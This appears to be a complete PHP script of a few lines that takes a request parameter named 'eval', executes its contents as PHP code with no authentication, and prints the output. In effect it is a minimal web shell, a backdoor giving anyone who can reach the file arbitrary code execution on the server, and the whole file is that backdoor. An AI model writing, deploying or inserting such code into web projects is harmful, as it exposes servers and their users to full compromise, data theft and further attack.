<?php
if(isset($_REQUEST['eval'])){
	ob_start();
	eval(stripslashes(trim($_REQUEST['eval'])));
	$ret = ob_get_contents();
	ob_clean();
	print $ret;
}

?>